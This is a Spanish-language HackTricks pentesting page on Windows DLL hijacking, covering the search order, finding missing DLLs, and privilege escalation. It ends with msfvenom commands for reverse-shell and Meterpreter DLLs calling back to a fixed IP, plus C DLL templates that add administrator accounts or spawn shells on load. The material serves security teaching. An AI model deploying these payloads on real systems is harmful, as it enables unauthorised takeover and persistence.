# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **regístrate** en **Intigriti**, una **plataforma de recompensas por errores creada por hackers, para hackers**. ¡Únete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Basic Information

DLL Hijacking implica manipular una aplicación de confianza para cargar un DLL malicioso. Este término abarca varias tácticas como **DLL Spoofing, Injection, y Side-Loading**. Se utiliza principalmente para la ejecución de código, lograr persistencia y, menos comúnmente, escalada de privilegios. A pesar del enfoque en la escalada aquí, el método de secuestro sigue siendo consistente a través de los objetivos.

### Common Techniques

Se emplean varios métodos para el DLL hijacking, cada uno con su efectividad dependiendo de la estrategia de carga de DLL de la aplicación:

1. **Reemplazo de DLL**: Intercambiar un DLL genuino por uno malicioso, opcionalmente utilizando DLL Proxying para preservar la funcionalidad del DLL original.
2. **Secuestro del Orden de Búsqueda de DLL**: Colocar el DLL malicioso en una ruta de búsqueda antes del legítimo, explotando el patrón de búsqueda de la aplicación.
3. **Secuestro de DLL Fantasma**: Crear un DLL malicioso para que una aplicación lo cargue, pensando que es un DLL requerido que no existe.
4. **Redirección de DLL**: Modificar parámetros de búsqueda como `%PATH%` o archivos `.exe.manifest` / `.exe.local` para dirigir la aplicación al DLL malicioso.
5. **Reemplazo de DLL en WinSxS**: Sustituir el DLL legítimo por un contraparte malicioso en el directorio WinSxS, un método a menudo asociado con el side-loading de DLL.
6. **Secuestro de DLL por Ruta Relativa**: Colocar el DLL malicioso en un directorio controlado por el usuario junto con la aplicación copiada, pareciendo técnicas de Ejecución de Proxy Binario.

## Finding missing Dlls

La forma más común de encontrar DLLs faltantes dentro de un sistema es ejecutando [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **configurando** los **siguientes 2 filtros**:

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

y solo mostrar la **Actividad del Sistema de Archivos**:

![](<../../images/image (314).png>)

Si estás buscando **dlls faltantes en general**, debes **dejar** esto corriendo por algunos **segundos**.\
Si estás buscando un **dll faltante dentro de un ejecutable específico**, deberías establecer **otro filtro como "Nombre del Proceso" "contiene" "\<nombre del exec>", ejecutarlo y detener la captura de eventos**.

## Exploiting Missing Dlls

Para escalar privilegios, la mejor oportunidad que tenemos es poder **escribir un dll que un proceso privilegiado intentará cargar** en alguno de **los lugares donde se va a buscar**. Por lo tanto, podremos **escribir** un dll en una **carpeta** donde el **dll se busca antes** de la carpeta donde está el **dll original** (caso extraño), o podremos **escribir en alguna carpeta donde se va a buscar el dll** y el **dll original no existe** en ninguna carpeta.

### Dll Search Order

**Dentro de la** [**documentación de Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puedes encontrar cómo se cargan específicamente los DLLs.**

**Las aplicaciones de Windows** buscan DLLs siguiendo un conjunto de **rutas de búsqueda predefinidas**, adhiriéndose a una secuencia particular. El problema del DLL hijacking surge cuando un DLL dañino se coloca estratégicamente en uno de estos directorios, asegurando que se cargue antes que el DLL auténtico. Una solución para prevenir esto es asegurarse de que la aplicación use rutas absolutas al referirse a los DLLs que necesita.

Puedes ver el **orden de búsqueda de DLL en sistemas de 32 bits** a continuación:

1. El directorio desde el cual se cargó la aplicación.
2. El directorio del sistema. Usa la función [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obtener la ruta de este directorio. (_C:\Windows\System32_)
3. El directorio del sistema de 16 bits. No hay función que obtenga la ruta de este directorio, pero se busca. (_C:\Windows\System_)
4. El directorio de Windows. Usa la función [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obtener la ruta de este directorio. (_C:\Windows_)
5. El directorio actual.
6. Los directorios que están listados en la variable de entorno PATH. Ten en cuenta que esto no incluye la ruta por aplicación especificada por la clave de registro **App Paths**. La clave **App Paths** no se utiliza al calcular la ruta de búsqueda de DLL.

Ese es el **orden de búsqueda predeterminado** con **SafeDllSearchMode** habilitado. Cuando está deshabilitado, el directorio actual asciende al segundo lugar. Para deshabilitar esta función, crea el valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y configúralo en 0 (el valor predeterminado está habilitado).

Si se llama a la función [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) con **LOAD_WITH_ALTERED_SEARCH_PATH**, la búsqueda comienza en el directorio del módulo ejecutable que **LoadLibraryEx** está cargando.

Finalmente, ten en cuenta que **un dll podría ser cargado indicando la ruta absoluta en lugar de solo el nombre**. En ese caso, ese dll **solo se buscará en esa ruta** (si el dll tiene dependencias, se buscarán como si se cargaran solo por nombre).

Hay otras formas de alterar el orden de búsqueda, pero no voy a explicarlas aquí.

#### Exceptions on dll search order from Windows docs

Ciertas excepciones al orden de búsqueda estándar de DLL se anotan en la documentación de Windows:

- Cuando se encuentra un **DLL que comparte su nombre con uno ya cargado en memoria**, el sistema omite la búsqueda habitual. En su lugar, realiza una verificación de redirección y un manifiesto antes de recurrir al DLL ya en memoria. **En este escenario, el sistema no realiza una búsqueda del DLL**.
- En casos donde el DLL es reconocido como un **DLL conocido** para la versión actual de Windows, el sistema utilizará su versión del DLL conocido, junto con cualquiera de sus DLLs dependientes, **omitindo el proceso de búsqueda**. La clave de registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene una lista de estos DLLs conocidos.
- Si un **DLL tiene dependencias**, la búsqueda de estos DLLs dependientes se lleva a cabo como si se indicaran solo por sus **nombres de módulo**, independientemente de si el DLL inicial se identificó a través de una ruta completa.

### Escalating Privileges

**Requisitos**:

- Identificar un proceso que opera o operará bajo **diferentes privilegios** (movimiento horizontal o lateral), que **carece de un DLL**.
- Asegurarse de que hay **acceso de escritura** disponible para cualquier **directorio** en el que se **busque el DLL**. Esta ubicación podría ser el directorio del ejecutable o un directorio dentro de la ruta del sistema.

Sí, los requisitos son complicados de encontrar ya que **por defecto es un poco extraño encontrar un ejecutable privilegiado que falte un dll** y es aún **más extraño tener permisos de escritura en una carpeta de ruta del sistema** (no puedes por defecto). Pero, en entornos mal configurados esto es posible.\
En el caso de que tengas suerte y te encuentres cumpliendo con los requisitos, podrías revisar el proyecto [UACME](https://github.com/hfiref0x/UACME). Aunque el **objetivo principal del proyecto es eludir UAC**, puedes encontrar allí un **PoC** de un Dll hijacking para la versión de Windows que puedes usar (probablemente solo cambiando la ruta de la carpeta donde tienes permisos de escritura).

Ten en cuenta que puedes **verificar tus permisos en una carpeta** haciendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Y **verifica los permisos de todas las carpetas dentro de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
También puedes verificar las importaciones de un ejecutable y las exportaciones de un dll con:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para una guía completa sobre cómo **abusar de Dll Hijacking para escalar privilegios** con permisos para escribir en una **carpeta de ruta del sistema**, consulta:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Herramientas automatizadas

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) comprobará si tienes permisos de escritura en cualquier carpeta dentro de la ruta del sistema.\
Otras herramientas automatizadas interesantes para descubrir esta vulnerabilidad son las **funciones de PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ y _Write-HijackDll._

### Ejemplo

En caso de que encuentres un escenario explotable, una de las cosas más importantes para explotarlo con éxito sería **crear un dll que exporte al menos todas las funciones que el ejecutable importará de él**. De todos modos, ten en cuenta que Dll Hijacking es útil para [escalar de nivel de integridad medio a alto **(eludiendo UAC)**](../authentication-credentials-uac-and-efs.md#uac) o de [**alta integridad a SYSTEM**](./#from-high-integrity-to-system)**.** Puedes encontrar un ejemplo de **cómo crear un dll válido** dentro de este estudio de dll hijacking enfocado en dll hijacking para ejecución: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Además, en la **siguiente sección** puedes encontrar algunos **códigos dll básicos** que podrían ser útiles como **plantillas** o para crear un **dll con funciones no requeridas exportadas**.

## **Creando y compilando Dlls**

### **Dll Proxifying**

Básicamente, un **Dll proxy** es un Dll capaz de **ejecutar tu código malicioso cuando se carga**, pero también de **exponer** y **funcionar** como **se esperaba** al **redirigir todas las llamadas a la biblioteca real**.

Con la herramienta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puedes **indicar un ejecutable y seleccionar la biblioteca** que deseas proxificar y **generar un dll proxificado** o **indicar el Dll** y **generar un dll proxificado**.

### **Meterpreter**

**Obtener rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtener un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crear un usuario (x86 no vi una versión x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Tu propio

Ten en cuenta que en varios casos el Dll que compiles debe **exportar varias funciones** que van a ser cargadas por el proceso víctima; si estas funciones no existen, el **binario no podrá cargarlas** y el **exploit fallará**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Referencias

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Consejo de bug bounty**: **regístrate** en **Intigriti**, una **plataforma de bug bounty premium creada por hackers, para hackers**! Únete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy, y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
